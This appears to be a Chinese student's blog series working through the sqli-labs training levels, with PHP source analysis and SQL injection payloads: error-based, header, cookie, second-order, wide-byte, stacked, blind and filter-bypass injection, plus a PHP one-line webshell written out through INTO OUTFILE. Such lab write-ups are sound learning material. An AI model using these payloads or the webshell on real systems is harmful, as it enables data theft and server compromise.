注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。stripslashes(string)函数删除由addslashes()函数添加的反斜杠。 substr函数substr(string,start[,length])参数 描述string 必需，规定要返回其中一部分的字符串start 必需，规定在字符串的何处开始正数：在字符串的指定位置开始负数：在从字符串结尾开始的指定位置开始0：在字符串中的第一个字符处开始length 可选，要返回的字符数。如果省略，则返回剩余文本正数：从start参数所在的位置返回的长度负数：从字符串末端返回的长度这里补充一下我的理解：这个substr的意思是截取字符段，也就是截取你输入的数据前几位这样，然后将截取的数据进行过滤操作，即加入反斜杠操作 ctype_digit()函数ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。 mysql_real_escape_string()函数mysql_real_escape_string(string,connection)参数 描述string 必需，规定要转义的字符串connection 可选，规定MySQL连接。如果未规定，则使用上一个连接 mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符： \\x00 空值 \\n \\r 换行 \\ ’ “ \\x1a**知道这个点后 ，那就说明我们无法通过在账号一栏注入 ** 然后我们看这个密码这一栏有个引号，所以我们这就意味着我们可以在密码一栏通过密码来注入我们在账号一栏输入admin以后，接着在密码一栏输入我们的注入语句 1admin'and updatexml(1,concat('~',(select database()),'~'),1) -- 1123'and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~'),1) -- 那么我们如何绕过这个过滤呢？https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control 这个博客里面倒是说了个方法，但是用在这里好像不太合适，因为其实我们注意到他有一个substr函数，只截取了前15个字符，所以当我输入的语句超过15个的时候，后面的代码就自动被抛弃了。记得拓展学习SqlParameter 第 十八关这个关卡好像有点不太一样，先来看看源码： ![E_{358QK8A23J%N`T0Q%2LM](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202559.png) 可以看到在这一关，对于uname和passwd依旧做了addslashes()函数处理，所以想再这里注入不太可能 并且在输出uname和passwd的时候也没有单引号等字符的出现，所以想在这里注入是不可能的了 看这里 获取了uagent和IP 这个是干啥的？ HTTP_USER_AGENT：返回HTTP头部的USER_AGENT（user_agent的内容包含发出请求的用户信息）REMOTE_ADDR:：返回http头部IP地址接下来我们再来看看这些源代码 到底哪里可以让我们注入找到了一个insert语句 这里发现 后面有个引号，要是我们在里面输入我们的命令，是不是就可以获得我们需要的信息了？那我们该如何更改呢——burp suit 抓包工具，因为 我们从前面的$servent可以看出 这里是需要返回http头部的信息，所以。。。。懂的都懂试一下： 猜猜我发现了啥，这有个user_agent，OK 让我们吧大致思路理顺一下：一开始我们需要返回http发出请求的用户信息，如果我们将这个用户信息更改完我们的指令，那其实就是这样的$uagent=$servent[‘这里就是我们的注入语句’]然后这个查询语句会被代入到sql中执行，我们尝试一下将user-Agent替换成以下语句现在user-Agent这个语句的最后添加一个单引号，看看是否报错结果是会报错的，所以我们可以直接在burp suit里面添加我们的注入语句 1'or extractvalue(1,concat('~',database(),'~')),1,1) # 这里说说我的思路：因为我们前面知道，这个注入点是在insert语句当中的，我一开始没输入后面的，1,1导致出现错误提示：就是和insert前面插入值不对应的情况，他insert插入了三个值，所以我们这里也需要有三个值 然后#号注释掉后面的内容，然后至于后面的1加不加引号都无所谓，因为1无论加不加引号都是合法数据，但是 如果要加引号 一定要严格按照insert语句的格式 比如1 左右两边就要加 不然就会报错： 12'or extractvalue(1,concat('~',database(),'~')),'1','1') # 'or extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~')),1,1) # 接下来就是爆表 爆字符段了让我们愉快的进入19关吧这关和18关差不多就是注入的位置现在在Referer 第20关这里我们先看看源码吧依旧做了过滤操作，所以不能在账号密码这里操作我们发现他和前几关不一样的时候这里又获取了一个cookie数据 什么是cookie？Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息cookie是什么?有什么作用?cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页;而且，你自动保存的内容也是被记录在cookie当中的，当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告 感觉这个就有点危险呀，好像可以利用cookies做点什么不得了的东西？？？ 我们继续往下看 有点熟悉，我们好像可以利用这个cookee试试，这个时候我们依旧使用burp suit抓个包 第一次没看到cookie的数据 我们再点一次forward 这一次就有了 接下来让我们试试加个引号 出现了报错，然后我们再试试and 1=1 和and 1=2 不一样，报错了 ，所以这里存在注入点 接下来就是常规操作了 我们应该是要利用报错注入成功 代码是 1' and extractvalue(1,concat('~',database(),'~')) # 这里 我就在想为什么我要要按两次forward才能截取到含有cooKies的包呢？让我们回去看看源代码学到这里 有必要先总结一下几个常见函数，之前只是模模糊糊的概念：1.mysqli_query() 函数执行某个针对数据库的查询。2.mysqli_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有。（取出我们输入的那一行账号密码）3.setcookie() 函数向客户端发送一个 HTTP cookie。cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当计算机通过浏览器请求一个页面，就会发送这个 cookie。cookie 的名称指定为相同名称的变量。例如，如果被发送的 cookie 名为 “name”，会自动创建名为 $user 的变量，包含 cookie 的值。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。 1setcookie(name,value,expire,path,domain,secure) header（）跳转函数header(“Location:”)作为php的转向语句，接下来就跳转打开新页面，并且如果后面没有紧跟exit的话 他是会继续执行的只不过不会返回到页面上，要求header前没有任何输出。这就是为什么我们要连续按两次forward的原因了。接下来的语句好像也没啥其实在这一关中还可以使用union拼接select语句从这个途中我们不难发现 其实username password都是从cookee中获取的，然后我们之前也知道cookee那里存在注入点想要让我们需要的数据直接在username和paswrd这里输出，接下来我们就可以order by 然后 union select 拼接语句查询了，思路就跟之前的一样。 第21关不知道为啥我21关和22关是没有的但是我看了一下题目，是上传文件的题目 然后查了一下 果然还是要一句话木马，然后需要利用burp suit","link":"/2020/11/20/sqlilabs5/"},{"title":"sqlilabs6","text":"接下来是第二部分的21关其实感觉和第20关没有多大差别，我们看看源码吧 发现还是有点差别的 比如说： 有一个**$cookee = base64_decode($cookee);**好像是将cookee给编码解密了，说明前面肯定还有一个加密，我们用burp suit抓包试试 果不其然 他的cookee被加密了 我们直接网页搜索解密软件 然后发现结果是 admin然后我们利用这里来注入一下 看下源代码 发现是’)单引号组合括号的 ，然后我直接输入’) and 1=1# 发现他报错了 \\Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8mb4_0900_ai_ci,COERCIBLE) for operation ‘=’**有点奇怪 我们再来看看源代码 可以发现这边这个使用的是encodebase64_encode是加密,而base64_decode是解密所以我们来思考一下他代码是如何运行的 他是这样的 如果账号密码正确 则保存你此时的cookies，并且加密发送，所以我再burp suit抓包的时候，抓到的用户名就是加密的，然后跳转到下一个页面，在这个页面中要利用cookies输出账号密码，所以他又解码输出了，而这个时候如果我们要利用burp suit修改cookies的数据达到注入的目的，我们就需要将我们的注入语句也进行加密，这样他解密以后才会被mysql识别并执行命令。OK 大概了解整个运转过程后，我们寻找注入点发现在下面 有个’）单引号加括号的注入点，然后我们在burp suit注入试试uname后面的那串东西是1’)and extractvalues(1,concat(‘‘,database(),’‘))# 经过base64位编码以后的结果 这个又是什么神仙报错？？？？ 但是我们可以看到有个security 我们数据库的名字的出现 但是为了避免不是偶然我们再试试看，我无语了 原来是我函数名输错了，应该是extractvalue 所以正确的界面应该是 OK 利用报错注入成功 第22关这一题和上一题又有点不一样，题目说是基于双引号的注入但我们从这个语句可以发现，他不是直接在select里面添加双引号 而定义一个$cookee1 并且这个cookee1=”$cookee”其实按照php的语法上面那个其实可以等价为下面那个，但是我不知道他为啥要这样操作？更安全吗？然后就直接把上一题的单引号和括号换成双引号就行，其他的没啥区别 23关23关 又回到了以前熟悉的界面 但是好像跟之前的有不太一样，因为加了单引号报错 加了双引号和and1=1 and1=2 却不报错 让我们再来研究一下源码这里介绍一个函数preg_replace替换函数preg_replace 函数执行一个正则表达式的搜索和替换。语法：preg_replace(要替换的东西，替换成啥东西，哪个里面的东西需要替换);知道这个以后我们不难发现，再上面这个代码中 我们的注释符需要替换。 那么注释符被替换我们该如何实现注入呢？我们要回归使用注释符的本质：没加注释符前后面的语句因为没有闭合所以会报错，所以我们加了注释符直接让其消失就好了，而现在没了注释符，我们就需要将语句闭合起来，使其不报错，叫做单引号闭合绕过这个其实之前遇到过 加了超级多引号，我看太麻烦就没去试，今天看来不得不试了！！！在之前更正的原理中，我们知道了闭合单引号的真相，所以这关现在就显得很简单了有个问题：为啥order by 在这里好像不管怎么放置都是错误的，这就很纳闷了？？order by 后面加数字，加字段名都是可以的，但是字段名是不可以带引号的，意思是让这个列排序，但是因为单引号闭合后里面的数字变成字符串了这就产生了语法错误。 更本质的说法是：不只order by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等来自46关的一个补充纠错 payload：?id=-1’union select 1,database(),’3 这个时候数据库就出来了payload：?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ or’1=1 第24关这关就和之前的很不一样了查阅资料后 知道一件事：SQL注入一般分为两类：一阶SQL注入（普通SQL注入），二阶SQL注入什么是二阶注入：1.构造带有注入语句的危险payload1数据，在http请求中提交到服务器当中，该数据会被服务器存储到数据库当中2.当我们要修改该payload1数据的时候，程序在检索存储payload1的数据库的时候将会造成SQL注入，如果攻击成功，在第二次响应中返回结果3.也称为存储型注入，将可能造成sql注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生SQL注入。先来看看源码先从index.php看起：一开始就是一个session_start()函数seession：https://blog.csdn.net/zhengxijia2012/article/details/73437376谈谈我的理解，为什么我们一开始cookies可以在多个页面保存使用，就是因为有这个session函数发挥作用然后在其他源码中，我们不难发现，基本上每个数据都有过滤操作，但是我发现 在pass_change的时候，他的username是没有过滤操作的如上，在下面的update语句中 username是直接从数据库被调用的，这就意味着我们可能可以通过这个数据进行注入（二阶注入），如果我们要利用这点，也就是说我们必须有数据是带有危险字符的存储在数据库当中，那么接下来，我们需要在数据库中构建这样一个数据，从上面的代码中我们发现他的username是用单引号闭合的，所以我们需要构建一个单引号注入的数据——admin’# ，这里有个问题：不是被转义了吗，为啥在数据中还会以单引号的形式存在，这是因为转义只是暂时的，存储以后还是以单引号的形式存在的 接下来我们研究一下 为啥可以更改 原SQL语句： UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' 修改密码的SQL语句： update users set password='$pass' where username='$username' and password='$curr_pass' 最后真正执行的sql语句： update users set password=='$pass' where username='admin' 但是这个具有一定的局限性，就是说，我们只能修改特定的用户的密码，比如说我想修改上表中的dumb，那么我就得在创建一个dumb'#的数据存储在数据库当中。 接下来我们看看有没有其他攻击手法： **1报错注入：** ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201122617.png) 有错就die网页，so 报错注入不行2.延时注入有字符数限制，所以不行 第25关首先看一下源代码：发现定义了blacklist()函数作用如下，就是过滤掉 or 和and，那么我们该如何绕过呢？看到这个我们就知道是单引号注入，接下来我试着构建payload试试从那个preg_replace函数中我们可以看出，他是将or转义成啥都没有，所以有一种思路是，在and里面插入and 转义完后即可留下我们本来的语句所以payload 12?id=1'aandnd 1=2 --+?id=1'oorrder by 3 --+ OK 绕过成功 然后我们只需要用order by 查询字符段数目，然后union拼接一下语句即可绕过。 这里出现了一个$hint=$id; 然后最后又return了一个i$id，所以我们可以知道,$hint是用来储存存放数据的，作用是更方便，不过这也让我们知道我们输入的语句到程序里面会变成啥样的。 其他绕过方法绕过思路：（1）大小写变形 Or,OR,oR（2）编码，hex，urlencode（3）添加注释/or/（4）利用符号 and=&amp;&amp; or=||（5）双写绕过https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control 这个是关于绕过的以及CTF题目的一篇文章，感觉还挺厉害 我又没保存博客人傻了——-第25关a和25关没多大区别 26关先研究一下源代码 首先是一个新函数fopen()函数fopen()函数用于打开文件文件或者URL，语法:fopen(filename,mode,include_path,context)而在这个里面的意思是 打开那个txt然后写入数据。我们接着往下看 在这关当中，他过滤了很多东西 我们依次来看看吧，分别是： 三种注释符，空格，还有反斜杠，还有and，or（这里要特别注意information里面有个or所以也会被过滤， 所以在注入的时候记得注意也要双写）好了 接下来我们开始试着绕过：1.因为空格被过滤了，所以我们可以采取是用括号的方式绕过这个过滤2.由于注释符过滤，除了用一些特殊的字符代表注释符，我们这里先采用闭合单引号的方式绕过，那么我们知道，单引号内的内容会被转变成字符串，所以有用到数字的方法在这里都行不通，使用union拼接语句的时候，可以获取到数据库，但是再往下由于要使用limit所以也不行了，所以这里我们采取报错注入的方式：构建payload：//?id=1’aandnd(extractvalue(1,concat(‘‘,database(),’‘)))aandnd’1’=’1////?id=1’aandnd(extractvalue(1,concat(‘‘,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=’security’),’‘)))aandnd’1’=’1// 第26a关这关和26关没有多大区别，唯一区别是这里需要采取单引号+括号的形式来注入还是有其他区别的，比如在这关当中，他是不输出报错信息的，并且因为是采取单引号+括号闭合方式进行注入的，如果我们想要时间盲注的方式，也不太行因为闭合以后，单引号加括号里面的内容就会变成字符，跟之前用不了order by是一个意思。查了一下好像确实只能用%a0进行绕过了，然后接下来需要安装一下虚拟机 第27关这关过滤的是这关过滤的有如下内容，但是我们可以发现，这次没有过滤and但是过滤了select和union还有注释符那些然后我们可以发现，这一次的正则表达式和前面几个又有点不太一样，反斜杠后面又多了一些字母作用如下： 资料来源：[https://www.baidu.com/s?rsv_op=c2KYgWdLVYcV2R3VPVh1WafSTX6XL0b2NMNbgbbP5faVPMWOgMNVVPSOQOU9XXcQghM678gVQZ9QeQaJYeYWeIR0335XMNab436TIP42cPUMd06IThM4hLJa&amp;wd=fopen%E5%87%BD%E6%95%B0&amp;ie=utf-8&amp;tn=49055317_3_hao_pg] https://blog.csdn.net/onthewaygun/article/details/10009021?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control根据以上资料 我们可以知道，这次的正则表达式替换的更加牛，他是一直在替换，就是说不能双鞋，因为你双写完以后替换过一遍，待会还会再替换一次，所以这里我们只能采用大小写混搭的方式进行注入//刚刚居然崩溃了–导致没保存。。成年人的崩溃就在一瞬间。。。。。。// 那我们接下来构建payload：?id=1’and(extractvalue(1,concat(‘‘,database(),’‘)))and’1=1?id=1’and(extractvalue(1,concat(‘‘,(seLeCt(group_concat(table_name))from(table_schema))=’security’),’‘)))and’1=1 下面也是这样的一套组合拳，其实我发现，我们可以利用报错注入的原因是在报错注入的时候我们可以将所有数据一起报错出来（group_concat）函数，但是当只能使用时间盲注的时候就没办法了，因为都是需要数字说明截取。这里有个问题，为什么在下面的查询语句中or无法报错，但是and可以报错 27a关因为无报错信息所以只好采取时间盲注或者union select联合注入，然后就需要用到特殊转义字符。。开始搭linux系统 第28关 感觉还是需要使用linux系统进行操作会比较方便一些，用括号的方式进行闭合太累了28a关也和这个差不多 小结一下：1.最近做的都是被过滤的题目，要如何绕过过滤方法也就是这几种似乎也没啥好说的了–2.然后源代码的学习挺有用的，感觉看源代码对于整个过程会更了解一些，然后注入的过程也更有感触了。参考链接：https://www.cnblogs.com/forforever/p/13764024.html","link":"/2020/11/28/sqlilabs6/"},{"title":"sqlilabs7","text":"第29关首先研究一下源代码首先是这个$_SERVER[‘QUERY_STRING’]作用：获取？后面的值https://www.cnblogs.com/mitang/p/3874291.html 学习链接 然后去查阅了一下资料，这关原来是有两个服务器在共同作用 一个是Apache另一个是Tomcat 所以我的理解是，tomcat先对接受的数据进行过滤处理然后再交由apache（PHP），但其实我们可以看出在这个里面，也就是看看是否带数字，如果是的话就把这个数据传递给Apache，没有怎么进行过滤的感觉呀？原来使我们理解错了，这个的意思是：从get的id里面匹配以整数结尾的数据，如果我们在这个id 中插入我们的注入语句，那么匹配就会返回false，因为不是以整数结尾，这个过滤很强啊，相当于一个waf那么我们该如何绕过呢？ HPP（HTTPParameterPollution）利用这个在前面那张图中，我们得知tomcat是取第一个数据，apache是取第二个数据，并且apache才是处理我们数据并且输出的服务器，所以我们可以构造两个数据，让tomcat只取得第一个合法数据，而第二个危险语句就让apache处理，达到我们的注入效果。接下来构建payload：?id=1&amp;?id=-2’union select 1,database(),3 –+即可成功绕过 第三十二关宽字符注入问题还是先来分析一下源代码在这个题目当中，我们可以发现 他对get的的id进行了过滤，这里一开始有个疑问，他这边是对$string 而在下面的时候是对get[$id] 但是其中也没有让$string=这个get的命令。后来发现 在函数中其实get的这个数据就直接等于这个$string了 然后这边过滤的有反斜杠和单引号第一句是当中出现的preg_quote()**定义和用法preg_quote()需要参数 str 并向其中 每个正则表达式语法中的字符**前增加一个反斜杠然后接下来的两个是为了避免你想加一个反斜杠把上一个反斜杠给注释掉而写进去的 那么我们再往下看 看到一个set names gbk：可以再在建数据库的时候设置，也可以在创建表的时候设置，或只是对部分字段进行设置，而且在设置编码的时候，这些地方最好是一致的，这样能最大程度上避免数据记录出现乱码 在这个语句中的意思是 对$con1进行 set names gbk编码然后gbk是两个字节作为一个汉字，而uft-8是三个字节作为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围，两个字节才能形成文字） 那么我们如何实施注入呢，先把流程搞一遍：输入数据-&gt;进行过滤-&gt;对数据进行gbk编码-&gt;代入查询-&gt;输出结果接下来 攻击流程：输入带有危险字符的数据-&gt;进行过滤添加了反斜杠-&gt;对数据进行gbk编码(输出的ascii码大于128的字符转码以后和前面的转码后的反斜杠形成文字，只剩下单引号)-&gt;代入查询（执行(危险的)sql语句）-&gt;输出结果PS：iconv()进行编码转换的时候，也可能存在宽字符注入漏洞我们使用ascii码大于128的有一个%aa和%df构建payload:?id=1%a0’and 1=1 –+ ?id=-1%aa’union select 1,database(),3 –+为啥那边会变成乱码呢，因为windows系统不支持ascii大于128的显示下一个payload：?id=-1%a0’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+这个语句是不行的，因为单引号被过滤了，所以我们需要将security编码正确语句是：?id=-1%a0’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 –+因为mysql支持十六进制的数值，所以我们这里直接将数据转为16进制即可（0x表示16进制） **补充知识** 1.字符、字符集 字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。 2.UTF8 由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。 3.宽字节GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。MYSQL的字符集转换过程 1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection; 2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下： 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results。重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。一点小体会1.只有存在转义函数以及gbk编码的时候 才会出现宽字节注入，为什么呢？其实想一下，只有在我们输入单引号，然后函数转义给我们添加了反斜杠，这个时候我们输入ascii大于128的字符能达到吃字符，让单引号逃逸的效果。三十三关和上一关没多大区别，在看源码的过程中唯一的区别就在于三十三关使用的是addslashes进行转义 无多大区别 第三十四关这是一个post请求方式，在URL上面直接输入和在框里输入是不太一样的这里再来系统的了解一下一些编码的知识吧https://www.cnblogs.com/fnlingnzb-learner/p/6163205.html在这里我想在区分一下在啊url输入和在下面框里输入的区别：在上面的url输入的时候，如果你输入的时候 如果你已经输入的是一个符合url编码的格式的时候，他就不会理你，直接原样发送数据，但是当你在下面的框框的输入的时候，%会在经过一次编码变成%25 所以如果我们在下面的框框也是采用同样的输入方式的时候就会出错，那么该如何解决呢？法1:我们依旧可以按照做33关的方式输入，只需要用burp suit抓包把多编码的那个25删除即可 删掉25 即可得到 方法2：经过一番探索，终于弄明白了一个字符代表几个字节在不同的编码下是不一样的UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。url编码就是在uft-8编码的基础上，给编码的每个字节加上百分号 所以POST的请求中，数据的编码过程是这样变化的：当我们一开始输入的是汉字，那么会被先被uft-8编码，然后在被加上百分号就是url编码了当然也存在uft-16的编码方式，在这里我们输入这个数据：**’1雲'or 1=1 #’ ** 抓包 得到这个数据，我们可以知道这个汉字被转化为三个字节，，也就是uft-8编码。在传输到数据库里面，并且对单引号%27添加转义反斜杠，再被gbk编码，而这里我们这里我们知道，在gbk中两个字符就会被当成一个汉字，那么我们原本输入一个汉字，这个汉字被转化成三个字节，加上原本的单引号一共四个字节，当转义字符插入，就变成了五个字节，这个时候单引号依旧可以逃逸出。其实我觉得宽字节注入的核心在于：利用gbk编码的两个字符吃掉转义字符反斜杠，使得单引号逃逸出（前面好像说过了，但是现在更加明了哈哈哈哈哈）方法3：我们知道输入的数据会被编码为uft-8，然后被url编码，那么如果我们直接将其转化成uft-8，那么是不是也可以实现注入呢答案是不会，因为没有自动识别功能~https://www.qqxiuzi.cn/bianma/Unicode-UTF.php这是一个可以转码的网址OK 接下来就是暴表 啥的 组合拳冲了 补充知识：了解整个编码解码过程：https://www.freebuf.com/column/165567.html 第35关这关属实有点搞笑，转义却在id这里不加引号，直接构造payload就行了，然后后面需要security在转码一下就行 第36关这一关依旧是需要利用get宽字节注入 不过这关使用的转义函数是mysqli_real_escape_string()；直接构造payload：?id=-1%a0’union select 1,database(),3 –+下面就是组合拳了 第37关 和前面的post宽字节注入无多大区别，不过用得是mysqli_real_escape_string(),payload都没变 第38关先研究一下源代码mysqli_connect()函数打开一个到 MySQL 服务器的新的连接。语法：mysqli_connect(host,username,password,dbname,port,socket)； mysqli_select_db（）作用：用于更改连接的默认数据库。mysqli_select_db(connection,dbname)mysqli_multi_query()mysqli_multi_query(connection,query)； mysql_store_result()函数用于将mysqli_query()查询的结果集存储到变量中mysqli_more_results();mysqli_more_results(connection);参数：connection：必需。规定要使用的mysql连接功能，检查一个多查询是否有更多的结果。也没看到有啥过滤的代码然后看到id被单引号包裹，所以先试试常规操作吧利用union拼接select即可获得数据mysqli_multi_query()还是让人比较在意的，所以看看标题，原来这是让我们尝试堆叠注入的堆叠注入原理：字面意思就是多条语句一起执行。如何实现？我们都知道在mysql中，每一条语句结尾加分号（；）表示语句的结束，基于此，如果我们在执行完一条语句之后继续构造下一条语句，中间用分号表示前一条语句的结束，那么我们的语句的实现也就成为了可能。 和union的区别：union执行的语句是有限的，只能用来执行查询语句，而堆叠注入可以是任意的语句局限性：由于是第二条语句，所以页面是不会回显的，所以我们在前端页面无法看到返回结果，所以，在读取查询数据时，我们建议使用union（联合）注入，同时在使用堆叠注入之前，我们大多数时候也是需要一些数据库相关信息的，例如表名，列名字，当然API或者数据库（Oracle数据库）引擎不支持的限制下，也可能限制不足如果没有mysli_multi_query()的时候我们可以使用堆叠注入吗？答案是不行，因为此时无法处理多条语句。（局限性之一）构建payload：’;insert into users(id,username,password) values(5,’admmm’,’admmm’) –+插入成功，那么delete等危险操作也是可以实现的，如果更改的是管理员的账户，那操作空间还蛮大的，可是过于局限了。 第39关数字型注入 引号都不用加，直接注入就行了 第40关单引号加括号的闭合方式’) 既可以采取union闭合的方式，也可以用堆叠注入 但是错误不会回显，无法用报错注入 第41关这个是数字型注入，和第三十九关差不多但是无法使用报错注入因为报错也不回显。 第42关这关和之前的24关卡有点像 但是这关需要使用堆叠注入，并且在一开始登录的时候是没有对密码进行过滤的，所以我们可以添加一个我们的插入语句，因为在更改密码的时候 他依旧没有对用户名进行过滤，所以我们一开始在插入的时候就可以像之前一样,不对，其实是不一样的，因为我们知道前面我们是用#号注释掉后面，这样修改密码就是修改admin的了，就不存在报错，但是在这里，我们插入了语句，我们使用#就会把我们的插入语句后面给注释掉了，就导致报错无法正确插入数据：payload：admin=adm; password=1’;insert into users values(15,’admin’,’admin’) –当然也可以进行update修改 delete删除等操作，前提是要先知道他的表叫users； 接下来知道45关都是一样的，就不说了 小结：","link":"/2020/12/03/sqlilabs7/"},{"title":"sqlilabs8","text":"第46关在这一关中我们看标题 是order by注入 那么我们就先再把order by了解一下吧 感觉现在才真正理解order by为什么在前面可以用来查询字段数（列数），因为order by可以让每个列明按照升序或者降序的方式进行排序，所以当不存在这么多列的时候，他就不存在了。（这个理解有点浅薄，故再去查找了一下资料）:其实在看完说明书后，我还不是很理解，不是很懂order by为什么可以注入 因为我觉得他不像报错注入时间盲注那些有地方可以直接让我写代码，他后面还需要加数字，所以我就很纳闷。但是：在我发现order by后面的排序可以变成升序或者降序输入的时候，我突然有了一丝感觉：注入究竟是啥？指的不就是我们在外部输入的命令能被带进去数据库里面执行吗，所以只要满足：能被代入数据库执行命令，其实就存在可能注入点知道这点我们 我们可以发现，order by后面的数字是一个可控的参数，我们可以利用这个来构造我们的语句，使其被数据库执行， 而在这题中 他的查询语句是对我们输入的那一行进行排序输出的 看上面 他要求我们输入的一个sort 所以我们现在不能再?id=多少 而是要?sort=多少，然后再看他的查询语句，对于id是没有加引号之类的，所以是数字型注入，然后我们在想，要在order by 后面加上什么才会被执行呢，首先是不能有引号语句，如果有要将引号内的内容转给十六进制的，如果要加select，我们需要union来拼接，但是在这题中是行不通的，这是一个语法问题，：有union的时候，order by要以最后一个union为准，所以 order by必须放在最后一个union后面，那么我们只能换一种，首先我们先来考查一下是否存在注入点——根据我们输入的语句，页面发生变化构建payload:?sort=rand(true) ?sort=rand(false)rand()是产生一个随机数，但其实我们这里赋予了一个true和false，他里面的值就会不一样，而如果页面发生了改变，就说明我们的注入已经生效了，其实这里的本质是，测试这里能使用的语句都有啥，我们使用了rand(）函数，发现是可以产生页面变化的，然后里面的true和false其实代表的是1和0 rand()函数：RAND()函数调用可以在0和1之间产生一个随机数： 首先是报错注入：?sort=(extractvalue(1,concat(‘~’,database())) //这里连注释都不用，因为这个id后无其他语句这样子是成功的，下一个语句：堆叠注入，由于没有mysqli_multi_query所以不行接下来是时间盲注?sort =1 and if(substr((select database()),1,8)=0x7365637572697479),1,sleep(5)有效果，但是时间很长，所以我就在想为什么，(注意 sleep 是存在一个满足条件的行就会延迟指定的时间，比如sleep(5)，但是实际上查找到两个满足条件的行，那么就会延迟10s,这其实是一个非常重要的信息，在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(0.001) 看最后多少秒有结果，推断表的行数)原来是这样，参考链接：https://blog.csdn.net/weixin_43536759/article/details/104882964这里再介绍另外一种时间盲注：benchmark（a,md5(1))是对某个计算（md5)重复多(a)次，不能精确掌控延迟时间构建payload：?sort= (select if(substring(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(‘1’)),null) from (select database() as current) as test) 接下来是布尔盲注无反应procedure analyse 注入procredure analyse中 支持两个参数：那么我们就来构造试试，在mysql8.0中好像已经移除了，所以我们就蛮看一下，这个主要是用在oder by limit后面的 payloadSELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);这个是构建的payload 而这里添加除了time-base的语句 其他好像都不太行 学习链接：https://www.freebuf.com/articles/web/57528.html 试试上传文件注入 正好好久没碰了，复习一下 在之前我们是通过构建 union select “?php @eval($_post[cmd]);?&gt;” into oufile 目标文件夹（能被PHP在网页打开的文件地址）然后构造完以后我们就可以利用菜刀连接就行了下面我们在这里试一下，也是可以的 第四十七关：加个单引号第四十八关：无报错，所以只能用时间盲注，或者布尔盲注第四十九关：同上 第五十关看到了mysql_multi-query所以我们可以用堆栈注入，直接拼接就行，再看后面也无啥过滤的东西 51关：加了个单引号52关：没有报错，但是可以继续堆栈注入53关：单引号无报错，可堆栈注入，时间，布尔啥的就不说了 